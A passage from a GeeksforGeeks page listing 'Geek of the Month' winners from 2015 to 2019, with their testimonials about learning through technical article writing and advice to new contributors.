but with 13 articles published and hoping for a lot more to be published in the coming days, the amount of research I have done to get my articles published has helped boost my programming knowledge by a fairly large amount. If you have a knack of programming and a bit of ‘Teacher-ly’ feeling in you and you want to contribute your knowledge to someplace where it doesn’t get unnoticed, you should immediately give content writing in GeeksforGeeks a shot. Trust me, this is the place where your contribution will never get ignored. Wishing Team GeeksforGeeks and their readers a lot of Good Luck for the New Year and also for the New Decade 🙂 Certificate : Ripunjoy Medhi, Published Articles Geek of the month – November 2019 Testimonial: I would like to thank GeeksforGeeks for making me the “Geek of the Month”. I am thrilled to receive this title. Writing for GeeksforGeeks has been a great learning experience. Clean and well-formatted code has become an equal priority along with the functionality of the code. Researching the topic before writing gives one a thorough understanding of the material and opens up the numerous possibilities a problem can be tackled. I have actually learned more web development writing for this site than learning on my own. This is one of my very first internships and I am grateful for the knowledge and confidence it has given me. I would also like to thank the editorial team and the others involved in managing the website. Cheers! Certificate : Sayantan Maiti, Published Articles Geek of the month – October 2019 Testimonial: I would like thank the GfG team for giving me the geek of the month title. I feel amazing recieving this felicitation. So when I started writing articles for geeksforgeeks the main thing I had in my mind was my personal growth in the computer science fundamentals and the joy of giving back to the community what I know. My experience at GfG has been more than this. I have learnt how to express my thoughts more clearly and succinctly. I learnt how to write clean and easy to understand code. My concepts in dynamic programming have definitely got better because of the learning I used to do before writing an article to publish on the GfG website. All this learning with the joy of being able to give back to the computer science student community is simply amazing I have loved writing high quality articles for geeksforgeeks and would love to continue doing so in the future as well. Thank you so much for the appreciation 🙂 Certificate : Kartik Arora, Published Articles Geek of the month – September 2019 Testimonial: I started writing articles on GeeksforGeeks just to try something new. But with the time I realized it’s effect on me. First of all, to write an article on a particular topic one need to be very clear on that topic. That led me to research more about the codes and algorithms and helped me to get a clear understanding on a particular area. Apart from that, I learned to write codes in a beautiful manner, came up with new algorithmic problems and improved myself a little bit after writing every article. And finally earning the “Geek of the Month” title. Thank you team GeeksforGeeks for giving me so much in a short span of time. I am not going to leave this platform very soon. Certificate : Ganesh Patra, Published Articles Geek of the month – August 2019 Testimonial: I have started writing articles at GeeksforGeeks in my summer vacation. By the time, I have learned many things like, “How to write a readable, flexible and clear code”, “How to write something such that people can understand easily ( this improved my explanation skills )”, “How to Communicate with people ( While conversation with the reviewers )”. All these things have increased my confidence. Furthermore, Earning money while sharing knowledge with 26+ million monthly GeeksforGeeks readers is amazing, isn’t it? After all these things, earning the “Geek of the Month” title, I am very happy. Thank you to GeeksforGeeks. I will continue my journey with GeeksforGeeks. Certificate : Aakash Panchal, Published Articles Geek of the month – July 2019 Testimonial: First thing first, thanks to GEEKSFORGEEKS for rewarding me such a great and cool title. Writing articles on such a platform, definitely boosted my confidence in a particular field. I think the best part while learning something is in doing practicals and no such platform is giving an opportunity to solve the problem first and if one can’t then, one can go for the explanation. So that is why I chose GFG. Again Thank you GeeksForGeeks.😊 Certificate : Pranchal Katiyar, Published Articles Geek of the month – June 2019 Testimonial: I am very thankful to GeeksforGeeks and its entire team for giving me such an amazing title and helping me in my programming and writing skill. I always wanted to use my passion for programming and writing to share my knowledge and experience with others. There are so many students and professional people confused in their career path and I was asked multiple times to choose the right resource for programming and coding. I always recommended everyone to check all the resources available on GeeksforGeeks for coding and other computer science subjects. I came to know about GeeksforGeeks through my friends and later I found that this is really a wonderful platform to improve and share my knowledge with others. When my articles started appearing in Google top news feed it gave me the confidence to write more and help others. GeekforGeeks also helped me to be in touch with amazing programmers from top industries. Interaction with Mr. Sandeep Jain and other members of GeeksforGeeks has been really a wonderful journey for me. Advice for Contributors: Passion matters a lot when you try to achieve something and you become more powerful when you share your knowledge with others. Whenever you share knowledge through your writing, do not use complicated words where readers feel lost or not connected. Keep your language simple, give examples and think from a reader’s perspective. In the end show your determination, learn , share and create your own history to become a hero in the eyes of this world. Certificate : Anu Upadhyay, Published Articles Geek of the month – May 2019 Testimonial: I would like to thank GfG for considering me of this worthy recognition. I believe GfG is a community which aims to support and facilitate young and enthusiastic minds all over the globe. Contributing my bit for this immense platform seems useful after seeing its reach and helpfulness for other readers. This platform has provided me an exposure to programming and helped me during my learning process. I will make sure to write better articles for benefit of readers. Cheers ! Certificate : Kritagya Agarwal, Published Articles Geek of the month – April 2019 Testimonial: Firstly I would like to thank GFG team for rewarding me with such a beautiful title. It has provided me with a great opportunity to enhance my knowledge and it also improves my own writing skills. Working as a Content Writer has been a great experience with GFG and having a wonderful journey. GFG is a good platform for sharing knowledge of computer science and developing our programming skills. This title encourages me towards writing more and quality articles. Certificate : Manas Chhabra, Published Articles Geek of the month – March 2019 Testimonial: First of all, I would like to thank GeeksforGeeks community for awarding me with such an awesome title. During this whole period of my content writing internship, writing articles for GeeksforGeeks helped me immensely in upgrading my coding skills. This prestigious title has now encouraged me towards writing more and even better articles. I would once again thank GeeksforGeeks. Happy Coding! Certificate : Sakshi Srivastava, Published Articles Geek of the month – February 2019 Testimonial: Thanks a lot GeeksforGeeks for awarding me with this amazing title. I have always been passionate about teaching and helping others and thus, the role of ‘Technical content writer’ suited me well. It also helped me improve my own writing and programming skills. I will keep contributing more articles in the future hoping it will help others in increasing their knowledge. Once again, thanks for this amazing title. Certificate : Divyanshu Shekhar, Published Articles Geek of the month – January 2019 Testimonial: Thank you so much GeeksforGeeks for providing me with this wonderful opportunity to write for India’s one of the largest portals for Geeks. I would like to extend my sincerest gratitude towards the GeeksforGeeks team for giving me such an opportunity and platform that not only has helped me enhance my skills and knowledge as a content writer but also helped me learn and grow immensely throughout this journey. It is always a great pleasure when someone contacts you on your social media handle and thank you for the articles that you have written which helped them clear their doubts or helped them digest some of the difficult topics. This program has benefited me immensely at the personal and intellectual level. Finally, I would like to recommend all the aspiring young folks out there to be a part of this wonderful journey and experience it all for themselves”. Certificate : Shubham Ranjan, Published Articles Geek of the month – December 2018 Testimonial: “First of all, thank you GeeksforGeeks for providing me an opportunity to contribute to this amazing platform and also appreciating my efforts. GeeksforGeeks has always been a major source of knowledge for me and to be able to share my knowledge with others through their website gives me immense pleasure. Publishing article on any topic requires a great understanding of that topic which has helped me to strengthen my concepts. Contributing codes for the existing articles has enhanced my ability to read and understand the code written by others. I suggest that everyone should try contributing to GeeksforGeeks. Not only will it help the other geeks but it will also help you to learn and master new topics. Thanks again GeeksforGeeks!”. Certificate : Rituraj Jain, Published Articles Geek of the month – November 2018 Testimonial: “Thanks a lot GeeksforGeeks! I still remember the day when I applied for a content writing internship at GeeksforGeeks. Since then, I have always been committed to contributing my best for the organization. An accolade of “Geek of the month” is really a huge encouragement and awards like these not only endorse our commitment towards the organization but also ignites within us the fire to keep stretching ourselves more and more. Thank you so much to complete team of GeeksforGeeks!”. Certificate : Ankita Saini, Published Articles Geek of the month – October 2018 Testimonial: “At the very outset I will extend my huge compliments to GeeksforGeeks for the acknowledgement that I have received from you.It has been a great voyage so far. GeeksforGeeks has got me introduced to the very new world of computer science and programming scenario.It has imbibed so many intstrumental skills in me that I can boast about having a wide range of knowledge in variety of fields pertaining to computer science field.Gfg is the edific of the ground where the real elixir emerges and it was gfg only that drove me to dive deep into anything and churn out the best out of it. Gfg is one of the constructive and the most prominent platforms to learn and practice with different types of topics, articles, and resources available over here. And I will indeed suggest all the computer science aspirants go through it thoroughly and develop a deep interest in it.”. Certificate : Gaurav Kumar, Published Articles Geek of the month – September 2018 Testimonial: “I would like to thank the entire GFG team for providing me the opportunity to contribute articles. Being a content writer, I learned something new from every article I have contributed and I gained most of the knowledge from the GeeksforGeeks. Writing articles helped me a lot to improve my competitive performance. I would like to suggest everyone to go through the articles provided on GFG. So, Keep coding and keep writing. Happy Coding😊”. Certificate : Asipu Pawan Kumar, Published Articles Geek of the month – August 2018 Testimonial: “I would like to thank GeeksforGeeks for the honor and I am glad that I am a part of it. I started my content writing internship at GeeksforGeeks in my first year. The internship has helped me a lot in clearing my concepts in various fields. GeeksforGeeks has been helping many engineering students to have a better understanding of several algorithms ,data structures and programming languages. GeeksforGeeks has detailed articles on various topics of Computer Science and it has helped me a lot in improving my Competitive Programming skills. I sincerely thank GeeksforGeeks team for all the help and support they have provided me during my internship period and for providing such a wonderful platform to gain knowledge and help others”. Certificate : Arnab Kundu, Published Articles Geek of the month – July 2018 Testimonial: “I would like to thank GeeksForGeeks for choosing me as the Geek of the Month. I loved working with the Geeks team throughout the entire month. I learned a lot of new and creative things about content writing, like proper formatting, clarity of expression, Latex formatting. Apart from that, obviously it is a very good feeling to share your knowledge and problem-solving skills with the community. I believe that GeeksForGeeks is doing a really great job through its website, by helping thousands of students to learn and understand and develop technical skills, apart from offering great support during Internship and Placement preparation for college students. It is a wonderful feeling to be a part of this great team. I would recommend all the students who are interested to go through GeeksForGeeks for any sort of doubts/ explanations for any kind of Computer Science fields. Certificate : Aayush A Chaturvedi, Published Articles Geek of the month – June 2018 Testimonial: I would like to thank GeeksforGeeks team for choosing me for this title. I have a good learning experience working as technical content writer with GeeksforGeeks. It is through continuous support and feedback provided by GeeksforGeeks team that I am able to accomplish my tasks and share my knowledge with other geeks. Technical content writing has certainly improved my problem solving and explanation skills. At last, I will like to thanks GeeksforGeeks team for providing such an amazing platform where one can learn a lot of new concepts and at the same time share their knowledge with other geeks. In my opinion, one should surely try their hands at technical content writing because as the saying “Knowledge increases by sharing but not by saving”. Certificate : Nikhil Jindal , Published Articles Geek of the month – May 2018 Testimonial: I’d really like to thank the Geeksforgeeks team for this honor. It has been an amazing experience, writing articles for a platform this huge. Writing articles on any topic requires reading about it in great depth, which has only increased my knowledge to a huge extent. Be it algorithms and data structures or operating systems and microprocessors, each article has helped me strengthen my concepts. It gives me great pleasure knowing that there are thousands out there who will be reading my articles and benefitting from them. “What’s the use of knowledge if you can’t share it with others?”. Geeksforgeeks gave me the perfect opportunity to achieve that. I’d recommend all of the readers to give technical content writing a try, you’ll not regret it at all! Certificate : Anjali Agarwal , Published Articles Campus Geek of the Year – 2017 Testimonial: Thank you so much team GeeksforGeeks for choosing me for this title. It really takes a lot of hard work and patience to accomplish all tasks related to G4G, whether it’s conducting workshops, or writing great articles, or any minor thing. All because, you are a part of such a great tech team, so you have to keep the things perfect from all edges. Team of G4G is so much supportive and passionate to help us in all aspects. It has helped me to inject programming in my veins. Various programs by G4G helps students in learning with earning, as it offers a lot of opportunities including an outstanding Campus Ambassador Program, Paid Internship Opportunities, Incentive-based program, Placement Opportunities, etc. A big thumbs-up to the G4G team for providing such a great platform to students all over the world, where we get the opportunity to develop our skills, let it be public speaking during workshops, technical writing, problem-solving or anything related to my Computer science branch. Certificate : Vishal Gupta Geek of the month – April 2018 Testimonial: It has been a good learning experience for me working as an intern at Geeksforgeeks and I would like to extend my gratitude towards the team for giving me such an opportunity and platform that not only has enhanced my skills and knowledge as a content writer but also helped me learn and grow immensely. As a student, the kind of articles that came my way, helped me grasp some crucial topics and that knowledge helped me stand out in many situations such as examinations, interviews, and competitions. Also, I have imbibed the subtle art of time management and being organized due to the kind of work platform the team has provided me with. Today Geeksforgeeks is one of the biggest platforms for anyone who wants to learn anything related to Computer Science and it is not restricted to a few topics but a large spectrum which enables greater assistance to people. At last, I would like to thank the Geeksforgeeks team for having me as a part of this amazing team and I hope that my contribution to this portal would be fruitful to any such categories available on the platform. Certificate : Shubrodeep Banerjee , Published Articles Geek of the month – March 2018 Testimonial: First of all, I would like to thank the entire GFG team for the opportunity and for their continuous support. No doubt that GFG is the best coding platform today. Optimization of code is the real game in computer science and GFG is the best weapon to be the winner of this game. GFG has taken off in the search engines like a rocket, with their hard work and continuous efforts. Apart from programming, a lot of questions are asked from the subjects like C/C++/OS/CN/DBMS when you sit for an interview. GFG has a large number of quality articles on all these topics all set up in a well-structured manner. Overall, so far, it has been an excellent journey working as an intern here. I am glad to be a part of such an amazing and supportive team. Tips to contributors : 1)The quality of the articles you write matters a lot because you are contributing to a platform where a lot of people are going through your content. 2)Avoid the bookish language. 3)Provide the content in easy language, so that everyone from beginner to expert can understand it easily. At last, it doesn’t matter how big or small your contribution is, just keep going because while teaching others we teach ourselves. Certificate : Sahil Bansal , Published Articles Geek of the month – February 2018 Testimonial : I will love to thank the team of GeeksforGeeks sincerely and wholeheartedly for the support that I have been provided with. Its been a great journey with you, where I have been able to get the best out of myself. Writing contents has immensely increased my problem-solving and explaining skills. I am looking to gain more in the upcoming days from the “Google of Codes”, as I call GeeksforGeeks. Certificate : Raja Vikramaditya , Published Articles Geek of the month – January 2018 Testimonial : Gratitude is the expression of heart. Being a content writer at GFG , I would like to express my sincere gratitude towards it as it helped me a lot to think out of the box and compile articles that enhanced my technical skills in the area of Competitive Programming. One learns a lot when one tries to set up new and unfamiliar problems.Being a student, GFG provided a path to step forward in a planned and systematic way to learn and acquire knowledge which builds up a strong base foundation for the beginners. The availability of rich content in different subjects of computer science helps a student to resolve his queries to a great extent. Finally, I would like to suggest everyone, go through the articles available on GFG, try to explore, innovate and contribute so as to help others. Thank you GFG. Certificate : Ayush Jauhari , Published Articles Geek of the Year – 2017 (Category – Content Writing) Certificate : Mohit Gupta , Published Articles Geek of the Year – 2017 (Category – Videos) Certificate : Ishant Periwal Geek of the month – December 2017 Testimonial : Being a Content-Writer and Problem Setter on GFG what I have learnt is that having good programming skills doesn’t make you a good programmer/coder. To be good in this you must have the vision to judge other’s code also i.e. solving issues or removing errors by understanding other’s code is the key point to check yourself. While going through over other user’s code, you will get to know the more tricks and techniques to solve a problem which will help in enhancing your knowledge and you will also get to learn some good writing skills. “Learn while you write or Write while you learn” is the best thing which GFG is providing to us and also what I like the most. So, Keep Learning and Keep Writing. Happy Coding 🙂 Thanks GFG 🙂 Certificate : Sahil Chhabra , Published Articles Geek of the month – November 2017 Testimonial : As a GFG content writer and final-year student, I had visualized that GFG helps students for both the perspective that reinforces concepts and knowledge, or to prepare for their future placement opportunities. Starting as a beginner, I had explored myself about a wide range of concepts related to DS and algorithm from GFG, which provided me with many different effective problem-solving techniques. In addition to the subjective knowledge and placement preparation, regular training at GFG will certainly improve your approach to competitive programming. The best of GFG that has made a huge impact on me are daily updated articles on the homepage that offer a random but effective level of knowledge for students. Fly for your dream but make GFG your jet ✈️ 🙂 Certificate : Shivam Pradhan, Published Articles Geek of the month – October 2017 Testimonial : Being a content writer, I covered Competitive programming problems, applications and efficient implementation of pre-existing Data Structures and Algorithms. I learned something from every article I contributed. I would recommend content-writing to others as well as it will only broaden their concepts. Also, while writing an article, make sure to target beginners as well. A big thank you to G4G for helping many others like me. Certificate : Rohit Thapliyal Geek of the month – September 2017 Testimonial: GeeksforGeeks is the all-in-one destination to Computer Science related queries. It’s amazing to find all resources of this field at one place and arranged in a systematic way. The articles have elements of both quality and quantity which makes a perfect combination. Proper formatting of code and clean coded solutions to almost all problems can be found here. One thing which makes me visit the website regularly is that the content is frequently updated and hence one can always have an idea of what kind of questions are being asked. Also, detailed reference material of core computer science subjects like DBMS, COA, etc. are provided on the website which is very useful for exam preparation. With wide-ranging, GeeksForGeeks serves as the perfect platform for learning any beginner or advanced computer science-related topics. Certificate : Anant Patni Geek of the month – August 2017 Testimonial: If you are stuck in a CS topic or an algorithm problem, you will probably find a solution on GeeksforGeeks, not only will you find a solution rather you will find an efficient solution which has code in C/C++, Java, and Python. Once we get a solution we are relaxed isn’t? How about writing a solution of a problem faced by you? Such that when others encounter the same problem they can get an instant solution with a clean explanation. GeeksforGeeks provides a platform to share your solution for a problem or approach, while writing I observed that, I use to explore every aspect of a topic such that I can explain it in a simple language. Thank GeeksforkGeeks for providing me an opportunity to write, if you want to learn and share your knowledge then you are at the right place. Certificate – Sumit Ghosh Geek of the month – July 2017 Testimonial: After working as a summer intern here, I realized that it is a dream organization not just for the readers and students, but also for the contributors as well. Right from the assistance that one gets here while working, to learning new topics and then writing articles on those topics, it is a highly experience-gaining and knowledge-acquiring process, where you learn and write at each and every step. One thing that I realized during this internship is that it takes a whole lot of efforts to explain something than just knowing it. So, this is one thing where I feel I have made a lot of progress. Overall, it was an excellent journey working as an intern here and will keep contributing in the future as well. Certificate – Mrigendra Singh Geek of the month – June 2017 Testimonial: GeeksforGeeks is the incredible platform for students to learn, not only students also contributors. I being the Problem Setter of the GeeksforGeeks is thankful of its entire team for providing me such a opportunity in their platform. While working I learnt many new things and improved a lot in my competitive programming, which is still improving. I suggest every programmer to study algorithms and data structures from GeeksforGeeks. It makes every learner’s concept very clear and makes you learn new things. GeeksforGeeks encourages beginner to come forward and become part of it. Never stop learning. Keep learning!! Happy Coding 🙂 Certificate – Saksham Raj Seth Geek of the month – May 2017 Testimonial: I came to know about GeeksforGeeks when I started facing problems in Algorithms and Data Structures to solve problems solving skill in Competitive programming. GfG helped me enhance my Competetive programming concepts as well as my job preparation doesn’t seem difficult now. The best part about GeeksforGeeks is that we can see different methods to solve the same problem. Certificate – Somesh Awasthi Geek of the month – April 2017 Testimonial: I am a content writer at GeeksforGeeks and my articles are about advanced data structures and algorithms. I have written about 12 articles till now and my experience is great. I have learnt a lot while writing editorials. I am a competitive programmer and gained the majority of knowledge through GeeksforGeeks. Writing articles helped me a lot to improve my competitive performance. I am now able to analyze algorithms more clearly. The best thing that I gained by writing these technical articles is my confidence. Now I feel confident while explaining my logic and algorithm. I am pretty sure that this confidence will surely help me during my interviews as I would be very confident while explaining my logics to the interviewer. I would like to recommend content writing for beginners as it would surely help them in their career. I myself feel as if I have transcended my logical explaining skills and moreover my thinking skills. Happy coding 😉 Nitish Kumar – Intern at GeeksforGeeks Geek of the month – March 2017 Testimonial: I being the “Problem Setter and Technical Content Writer” on GFG extend my gratitude to the entire team for the opportunity, I have been provided. While working on such an incredible platform all my mental horizons have been exposed to a level much beyond my expectations. It has given me an exposure to the treasure house of knowledge about Data Structures, Algorithms and many more topics. While going through the incomparable list of articles, I have really developed my mind in a very healthy manner. I had a phobia of Programming when I initially started coding. Then I listen about GFG in my college and as soon as I started going through the site, Programming now seems to be a Cake Walk. The unbeatable and wisely planned Practice Set really do the magic, you develop your ideology and start thinking in a much logical way. Once you have practiced enough on GFG, you not only master the problems but can also solve the problems in a much more optimized manner. Advice to Contributors: I encourage beginners to come forward, gain knowledge through GFG and become a part of it and enrich themselves and others by sharing knowledge. Do refer the priceless and extremely beneficial ballots of articles, programs and Geek Quiz on GFG, that will surely help you in setting the strong base for coding. Certificate: Mohit Gupta Geek of the month – February 2017 Testimonial: I think GeeksforGeeks is a great platform to learn Computer Science concepts. From beginner to experienced, one can easily find and practice questions according to their level. G4G contains a huge number of technical articles with the proper and clear solution which help many of students to learn new approaches to solving the problem. The best part that I like about G4G is the Interview Corner which help to gain interview experience and student can expect what kind of question can be asked in an interview. As a contributor at G4G, it’s a great experience working with GeeksforGeeks. From this experience, I learn not only “how to code” but also “how to write neat and clean code”. Advice to new contributors: According to me, when you are writing an article, just keep in your mind that the reader can be a beginner. So, explain all the possible approaches. And for each approach, try to explain every concept in details. Certificate – Anuj Chauhan Geek of the month – January 2017 Testimonial: From the time I came to know about GeeksforGeeks, there has been a constant increase in my coding skills. GeeksforGeeks have a collection of articles both for beginner and for experts reviewed by the experts. The best part about GfG is different approaches for the same problem. Since everyone has unique skills and posses some knowledge, every person must share their knowledge of GfG and help fellow programmers. I’m glad to be a part of GeeksforGeeks. Advice to Contributors: Think of the better approach for every article you read on GfG, there may be a room for improvement. Also, try to add the articles on the top of the topics already covered. Certificate – Nikhil Kumar Singh Geek of the Year – 2016 Utkarsh Trivedi Certificate – Utkarsh Trivedi Geek of the month – December 2016 Testimonial: I got familiar with GeeksforGeeks as soon as I entered college life because of the amazing content it has. GeeksForGeeks is an amazing platform for Computer Science students. With comprehensive articles available on a range of topics, it serves as the preferred platform for learning any beginner or advanced topics. The exemplar codes provided are well documented and well explained. I wrote several articles in Python in the past some months and found it as a nice learning curve for myself too as many of my concepts got cleared while preparing those articles. It made me go one step further in understanding how things work! I will like to advise others too to start contributing in any field they are interested in! Just make sure that you write your articles with full dedication! Happy coding! Certificate – Nikhil Kumar Singh Geek of the month – November 2016 Testimonial: GeeksforGeeks provides an incredible platform for learning and sharing code. Diligently structured contents, meticulously designed quizzes, and incomparable practice set are few things that have helped GeeksforGeeks to stand out. Its credibility can be appraised by the fact that it’s referred by both geeks and wanna-be geeks. GeeksforGeeks follows a remarkable way of solving problems. It first takes a naïve or basic approach to solve the problem and then moves towards a more optimized and comprehensive approach. This not only helps one in getting hold of the topic but also demonstrate the power of optimization and I, for one, believes that optimization is the real game here. At last, do refer to GeeksforGeeks as it offers a plethora of codes and articles, which will help you in building a solid coding foundation. Happy coding! Certificate – Neelam Yadav Geek of the month – October 2016 Pratik Agarwal Testimonial for GeeksForGeeks : Since 10 months I was trying to conquer Data Structures and Algorithms which is the most important topic for any CSE or IT student and now because of GeeksforGeeks only I can see improvement in my skills. The articles are well explained and and any beginner can easily grasp the topics. Now also many more things are left for me to explore here such as the MCQs and the interview experiences which i believe will surely help in my future goal. I recommend GeeksforGeeks to each and every programmer whether to be a beginner or advanced level. Certificate – Pratik Agarwal Geek of the month – September 2016 Shashank Mishra Testimonial for GeeksForGeeks : According to me GeeksforGeeks is a platform for a person from where he/she can start it’s journey very smoothly. To learn things deeply one should start from the zero levels, it has to start from the basics and GFG is the best place for those people who actually wants to learn new things, who actually want to enhance their technical skills and who wants to compete with others in technical aspects. GFG provides all fundamental material of technical subjects using which students can prepare well for their interviews. GFG has also provided an online coding platform through which students can solve as many coding problems to make themselves good in coding area and the best thing about GFG is that it has divided the coding problems according to the levels likes school level, basic level, easy level, medium level, hard level which organizes the things together and in a well-defined sequence to get started . GFG provides all possible solution starts from Naive approach to the best-optimized solution for any problem, so people get to know many solutions for a single problem. All the content writers provide well-explained articles, in which each line of code and algorithm is clearly explained to the best possible way. The best part about GeeksforGeeks is that it also focuses on other Computer Science fundamentals like OS, DMBS, CN which are also a crucial part of an interview. I want to thanks GeeksforGeeks for making such an awesome element for preparation. What I am today is just because of GeeksForGeeks, it gave me everything which i wanted to prepare myself. I got placed in “Opera Solutions” and credit goes to GeeksForGeeks. Advice to Contributors: New contributors should provide fresh content in easy to understand language so that everyone from beginner to expert can understand it easily. They should also give some interesting questions based on the articles so that users can understand the concepts completely. They should write articles according to the beginner’s point of view. “Always keep yourself in learning mode, learn new things and share it with the world !” 🙂 🙂 Certificate – Shashank Mishra Geek of the month – August 2016 Chirag Agarwal Testimonial for GeeksforGeeks: GeeksforGeeks is by far the best platform I have encountered for learning computer fundamentals. The way GeeksforGeeks provides a solution for a problem by gradually going towards the optimal approach by looking all the other possible solutions is just phenomenal. The best part about GeeksforGeeks is that it also focuses on other Computer Science fundamentals like OS, DMBS, CN which are also a crucial part of an interview. Moreover MCQ’s on Automata Theory and Compiler Design helped me a lot during my college examination. I would strongly recommend one to refer GeeksforGeeks to build their computer fundamentals and also for their interview preparation. Advice for contributors: Don’t just simply provide the algorithm for the problem, also try to brief the reader how you got to that approach. Writing articles can improve your knowledge to a great extent since you will have to study every small detail regarding your article. Avoid bookish language; try to explain in the simplest way possible. Keep Contributing 🙂 ! Certificate – Chirag Agarwal Geek of the month – July 2016 Manjeet Singh Testimonial for GeeksforGeeks: “GeeksforGeeks” , a popular name in every person’s success story connected to IT industry , has no different story for me. Be it competitive programming, job interviews, various IT entrance exams and even in college or school, G4G stands as a best guide in any domain related to Computer Science for a novice to expert. And this very quality of providing guidance at versatile platforms and at any level of difficulties, be it complex data structures to simple data types, makes it different from other sites. This builds a broad viewership and a connect with all level of people connected with Computer Science in any manner. I again stand thankful to G4G on behalf of everyone benefited from it and encourage it to prosper more in its noble task. Advice for Contributors: Not only as a source of learning, G4G also serves as a platform for sharing the knowledge one exhibits regarding any topic related to computer science from algorithms to facts, from various languages, C++ to java at any difficulty level from a basic to expert. So if you have a topic you think is unique and which can be useful for all people never hesitate to share via the article. Only important thing is to adhere to the G4G rules laid for drafting an article to make it more presentable. All info. can be found on http://www.contribute.geeksforgeeks.org/ . More you share, more you learn. Keep learning! Keep Sharing! Certificate: Manjeet Singh Geek of the month – June 2016 Rachit Belwariar Advice to new contributors: According to me what makes G4G different from all the other websites is their articles. You won’t find even a single website other than G4G that regularly publishes articles. But here you will find articles of all kinds ranging from the most basic ones to some of the most unconventional topics. So, I advice others also to contribute and let’s share the knowledge !Testimonial for GeeksforGeeks: If you are related by any means to Computer Science, then you are in a way related to G4G. Whenever you come across any question/ new concept, you search it on the web and the first link you find will be of G4G. G4G is a hit because of its clean and understandable codes (G4G follows a strict list of rules which you can see here- https://www.geeksforgeeks.org/contribute/article-writing-style/). I would thank every single one who has contributed to it and made it a huge success. Geek of the month – May 2016 Harshit Jain Harshit is currently working as Front-end Developer at SAP Testimonial for GeeksforGeeks: I have been using GeeksForGeeks from 2010. The resources available on Data Structures and Algorithms is undoubtedly exceptional which helped me in college as well as while preparing for interviews before placements. Even after being in IT industry for about 2 years, I regularly enjoy reading interesting articles here. For current students, GeeksforGeeks now has a lot to offer including an outstanding Campus Ambassador Program, Paid Internship Opportunities, Placement Opportunities, etc. With the launch of Practice section a few months back, GFG officially entered into the domain of competitive programming. I regularly use this section and I found the overall interface including the web IDE to be great and easy to use. Cheers to the team!! Advice for new Contributors: I take GeeksforGeeks as a platform to share knowledge to help fellow geeks. With such a huge number of hits on the website each day, the content gets great viewership. When you contribute at such a level, you need to ensure high quality. This, in turn, gives you the opportunity to improve your knowledge and also your skills as a content writer. It also gives the opportunity to network with fellow contributors and to learn from them as well. Lastly, I would advise you to keep making contributions, big or small, as we also have a moral duty to give back to the community which gave us so much. Geek of the month – April 2016 Aditya Goel Testimonial: “Wisdom is sharing flowers in our basket and receiving different from others and thereby increasing our worth” and that is what GeeksforGeeks does. When it comes to placements, there is only one name that comes to my mind – GeeksforGeeks. Every IT graduate depends heavily on GeeksForGeeks while preparing for the technical interviews. Not just GeeksforGeeks helped me with my interview preparation; it has taught me several best coding practices that have significantly improved my coding style over the years. And the best part is that GeeksforGeeks is expanding. With various new initiatives like the Campus Ambassador program, G4G is reaching out to more and more students. It is not just limited to DSA/C/C++/Java articles; it is now becoming one of the best resources for a beginner to get started in the world of competitive programming too. We can find a huge collection of interview Experiences of top IT companies. One can also find great Stuff for Aptitude based Puzzles and for GATE preparation. Thank you once again GeeksforGeeks for providing the awesome platform for preparation. Advice to new Contributors: GeeksforGeeks provides an excellent platform to know other people’s way of thought. So, in the process, you learn several ways to solve a problem. During our childhood, learning pace is exponential which tends to decrease with age. GeeksforGeeks helps us brush up ourselves and sharpen our mind and it’s time to give something back to GeeksforGeeks. So keep Contributing and help other geeks!! Geek of the month – March 2016 Rahul Agrawal Rahul is our Campus Ambassador for LNMIIT, Jaipur. Testimonial: When it comes to programming, there is no other website which can surpass GeeksforGeeks. Thanks to their talent, GeeksforGeeks has taken off in the search engines like a rocket. In this day and age, it is very difficult to get ahead in the field of Computer Science without the support of gurus like GeeksforGeeks. The collection of articles and questions are superb with excellent explanation and simple solutions. Thank You GeeksforGeeks for providing such a great platform to learn and share knowledge. Advice to Contributors: Knowledge sharing is synergistic. We each enter into a conversation with a little knowledge and each come away with more knowledge. Knowledge sharing is about “working together”, “helping each other” and “collaboration”.Sharing knowledge is not about giving people something, or getting something from them; it is about creating a learning process. Believe in “Learn-Share-Learn” and keep Sharing!! Geek of the month -February 2016 Harshit Gupta Testimonial : I have been associated with GeeksforGeeks since past 10 months and I’m obsessed with G4G! It’s one of the best sites I’ve ever come across. It is helping people around the globe in achieving their dreams and what else can be better than that ? Its never-ending library has almost all the questions related to programming and a lot of articles are being added daily. Be a novice or a pro, G4G would never cease to amaze you! Need something better? GeeksforGeeks is EXPANDING. With amazing programs like Campus Ambassador , G4G is reaching out to students in their colleges and spreading knowledge. With the QA Forums, one can ask his/her queries and he’ll be answered. practice.geeksforgeeks.org and GeeksQuiz are again one of the biggest steps taken by them. I wish GeeksforGeeks all the best for the future, which, I know is going to be bright! Advice to Contributors : G4G follows a simple mantra, Learn-Share-Learn. “In teaching others, we teach ourselves” . Contributors work very hard to bring the best out of themselves. My advice to all the contributors out there is to keep working hard and believe in yourselves. Keep the interesting articles simple and easy-to-understand. Make sure that you convey the concepts with help of detailed explanations and more examples. Geek of the month -January 2016 Utkarsh Trivedi Advice to new Contributors: New contributors should provide fresh content in easy to understand language so that everyone from beginner to expert can understand it easily. They should also give some interesting questions based on the articles so that users can understand the concepts completely. Testimonial: GFG is a best platform for beginner as well as experienced programmers as It has a much larger collection of questions and articles with easy to understand solutions and It also has very active discussion forum which attaches you to a very large coding community and helps you a lot. Geek of the month -December 2015 Ekta Goel Advice to new Contributors: “Each one of us is an intricate, yet simplified strand in this web of programming. Contribute as much as you can. Knowledge is meant to be shared and you never know, with what you may be rewarded and applauded.” Testimonial: GeeksForGeeks is one of the best sites I have seen. Working on an initiative to help programmers out there in such selfless manner is worth applauding. Also, It has provided platforms to many potential coders to contribute their ideas. The variety of posts ( Question specific, Q&A, Project Ideas, Quiz etc ) has enhanced its reach ability across all domains. It was GfG only which motivated me to make my first extension (GeeksQuiz). Not only for B.Tech, but M.Tech and especially for job-seekers, the site is of much help. Geek of the month -November 2015 Gaurav Ahirvar Advice to new Contributors: GeeksforGeeks has always maintained a standard of questions and is all due to collective efforts and contribution of every contributor. Believe in quality than quantity. So keep posting interesting & useful articles, your experiences and help others!! Testimonial: I was already familiar and quite good with competitive programming but the questions asked in interviews and those in competitive programming challenges are not completely similar. GeeksforGeeks provided me the perfect environment to practice a variety of algorithms and very standard interview questions, that were both challenging and interesting. When you sit for an interview, apart from programming, majority of questions are asked on C/C++/Java/OS/Networking/OOPS and several other topics.G4G has a large number of useful articles on these topics all setup in a well-structured manner that helped me to get my skills from novice to an advanced level. Overall, G4G helped preparing me and many of pals in cracking the written as well as face-to-face technical interviews and landing at very good companies. I thank and appreciate the team to provide such an awesome platform to sharpen my skills and enhance my knowledge. I would 